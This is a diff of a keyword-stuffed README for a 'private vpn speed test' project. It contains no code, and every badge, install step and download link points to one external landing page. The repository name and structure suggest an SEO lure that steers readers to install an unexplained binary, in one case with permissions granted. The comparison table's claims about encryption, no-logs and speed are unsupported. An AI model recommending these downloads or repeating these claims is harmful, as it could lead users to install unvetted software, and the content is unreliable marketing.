@@ -1,28 +1,24 @@
 # ⚡ private vpn speed test
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20build-blue?style=for-the-badge)](https://spainharley.github.io/private-vpn-speed-test-landing/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-111111?style=for-the-badge)](https://spainharley.github.io/private-vpn-speed-test-landing/)
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](https://spainharley.github.io/private-vpn-speed-test-landing/)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest-2ea44f?style=for-the-badge)](https://spainharley.github.io/private-vpn-speed-test-landing/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-5865F2?style=for-the-badge)](https://spainharley.github.io/private-vpn-speed-test-landing/)
+[![License](https://img.shields.io/badge/License-MIT-black?style=for-the-badge)](https://spainharley.github.io/private-vpn-speed-test-landing/)
 
 ## About
 
-**private vpn speed test** is a hands-on workflow for measuring real VPN performance (not marketing numbers). It focuses on repeatable testing: baseline vs VPN, region hops, and stability checks so you can pick the fastest route without guessing.
+**private vpn speed test** is a straight-to-the-point guide and workflow for measuring **private vpn** performance the way it’s actually used: real routes, real servers, repeatable results. It focuses on what matters—**latency, throughput, stability**—and helps you spot bottlenecks fast.
 
-This repo is the project home:  
-- Repo: https://github.com/spainharley/private-vpn-speed-test-seo  
-- Download / landing: https://spainharley.github.io/private-vpn-speed-test-landing/
+This repo: https://github.com/spainharley/private-vpn-speed-test-seo  
+Project page + downloads: https://spainharley.github.io/private-vpn-speed-test-landing/
 
 ## Features
 
-- **One-pass speed test routine**: baseline → connect VPN → re-test → compare
-- **Latency + throughput focus**: ping/jitter + download/upload, not just one number
-- **Server selection sanity**: quick checks across **Global Servers** to find high speed routes
-- **Stability checks**: repeat runs to catch time-of-day dips and flaky exits
-- **Privacy and security focus**: test while keeping VPN fundamentals enabled  
-  - **AES-256 encryption**
-  - **No-Logs policy**
-  - **Kill Switch**
-- **Clean output**: results are easy to paste into issues, notes, or a PR
+- **Repeatable speed runs**: baseline vs. VPN vs. per-region server testing
+- **Stable connection checks**: jitter and variance notes, not just peak Mbps
+- **Server selection workflow**: pick the best region from **Global Servers** based on results
+- **Security posture reminders**: confirm **AES-256 encryption**, **No-Logs policy**, and **Kill Switch** are enabled before comparing
+- **High speed focus**: reduce overhead without breaking privacy settings
+- **Clean reporting**: record results consistently so changes are measurable
 
 ## System Requirements
 
@@ -30,64 +26,66 @@ This repo is the project home:
 |---|---|
 | Windows | Windows 10/11 (64-bit) |
 | macOS | macOS 12+ |
-| Linux | Ubuntu 20.04+/Debian equivalent |
-| RAM | 2 GB+ |
-| Storage | 200 MB+ free |
-| Internet | Stable connection (wired preferred for consistent results) |
+| Linux | Ubuntu 20.04+/Fedora 36+/Debian 11+ |
+| RAM | 2 GB minimum (4 GB recommended) |
+| Storage | 200 MB free |
+| Internet | Stable broadband connection (wired recommended for testing) |
 
 ## Installation
 
-> All downloads and start links point to the landing page.
+You can follow the workflow on any OS. If you’re installing the companion materials / quickstart bundle, use the landing page.
 
 ### Windows
-1. Open: https://spainharley.github.io/private-vpn-speed-test-landing/
-2. Download the Windows build.
-3. Install, then run the app.
-4. Run a baseline test (VPN disconnected), then connect VPN and re-run.
+1. Download the latest package from: https://spainharley.github.io/private-vpn-speed-test-landing/
+2. Install and launch the app/tools included in the bundle.
+3. Connect your **private vpn** and confirm **Kill Switch** is on.
+4. Run the baseline test (VPN off), then run VPN-on tests per server region.
 
 ### macOS
-1. Open: https://spainharley.github.io/private-vpn-speed-test-landing/
-2. Download the macOS build.
-3. Install the app (allow permissions if prompted).
-4. Test baseline → connect VPN → test again.
+1. Download from: https://spainharley.github.io/private-vpn-speed-test-landing/
+2. Open the package and follow the installer prompts.
+3. Enable the VPN, verify **AES-256 encryption** is active in your VPN client.
+4. Run baseline → VPN-on → per-region tests.
 
 ### Linux
-1. Open: https://spainharley.github.io/private-vpn-speed-test-landing/
-2. Download the Linux build.
-3. Install via your package method (or run the provided binary).
-4. Run the same baseline/VPN sequence for clean comparisons.
+1. Download from: https://spainharley.github.io/private-vpn-speed-test-landing/
+2. Extract and follow the included instructions for your distro.
+3. Connect the VPN, confirm DNS/route behavior, then run the test sequence.
+4. Save results after each region to compare variance.
 
 ## Comparison
 
+This table is the target checklist when you’re comparing providers or configurations. Speed is meaningless if the safety basics aren’t there.
+
 | Option | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
-|---|---:|---:|---:|---:|---:|
-| **Private VPN (tested with this workflow)** | High speed | ✅ | ✅ | ✅ | ✅ |
-| Typical free VPN | Low / inconsistent | ❓ | ❌ | ❌ | ❌ |
-| DIY proxy / tunnel | Medium | ❓ | ❓ | ❌ | ❌ |
+|---|---:|:---:|:---:|:---:|:---:|
+| private vpn (configured for testing) | High speed | ✅ | ✅ | ✅ | ✅ |
+| Typical free VPN | Low–Medium | ❓ | ❌/❓ | ❌ | ❌/Limited |
+| Misconfigured VPN client | Medium (spiky) | ✅ | ✅ | ❌ | ✅ |
 
 ## FAQ
 
-**Q: What does “private vpn speed test” actually measure?**  
-A: Baseline vs VPN throughput plus latency/jitter so you can see the real cost of encryption and routing.
+**1) What should I measure besides download speed?**  
+Ping/latency, upload, jitter/variance, and whether performance stays stable across multiple runs.
 
-**Q: Should I enable Kill Switch during testing?**  
-A: Yes. Test in the same conditions you’ll use daily. If Kill Switch affects speed, you’ll see it.
+**2) Why do results change between runs?**  
+Routing changes, local Wi‑Fi noise, server load, and protocol differences. Test wired if you can and run 3–5 repeats.
 
-**Q: Why do results vary between runs?**  
-A: Congestion, server load, and ISP routing. Run 3–5 passes per server and compare the median.
+**3) Should I disable the Kill Switch for higher speed?**  
+No. Speed tests that ignore safety settings don’t match real usage. Keep **Kill Switch** on.
 
-**Q: How do I pick the fastest server?**  
-A: Start closest geographically, then try 2–3 nearby regions. Keep the one with the best mix of low latency and stable download.
+**4) How do I pick the best server region?**  
+Start near your physical location for lowest latency, then test 2–3 nearby regions. Use the one with the best average and lowest variance.
 
 ## Download
 
-Get the latest build and instructions here:  
+Get the latest package and the step-by-step workflow here:  
 **https://spainharley.github.io/private-vpn-speed-test-landing/**
 
 ## Final CTA
 
-[![Run private vpn speed test](https://img.shields.io/badge/Run-private%20vpn%20speed%20test-blue?style=for-the-badge)](https://spainharley.github.io/private-vpn-speed-test-landing/)
-[![Get Download](https://img.shields.io/badge/Get-Download-2ea44f?style=for-the-badge)](https://spainharley.github.io/private-vpn-speed-test-landing/)
-[![View Repo](https://img.shields.io/badge/View-Repo-111111?style=for-the-badge)](https://github.com/spainharley/private-vpn-speed-test-seo)
+[![Run the private vpn speed test](https://img.shields.io/badge/Run%20the%20private%20vpn%20speed%20test-Start%20Now-ff6a00?style=for-the-badge)](https://spainharley.github.io/private-vpn-speed-test-landing/)
+[![Open Landing Page](https://img.shields.io/badge/Open-Landing%20Page-0ea5e9?style=for-the-badge)](https://spainharley.github.io/private-vpn-speed-test-landing/)
+[![Repo](https://img.shields.io/badge/Repo-private--vpn--speed--test--seo-111827?style=for-the-badge)](https://github.com/spainharley/private-vpn-speed-test-seo)
 
-*Private VPN performance is only real when you measure it the same way every time.*
+*Measure it clean. Pick the fastest safe server. Keep your privacy settings on.*
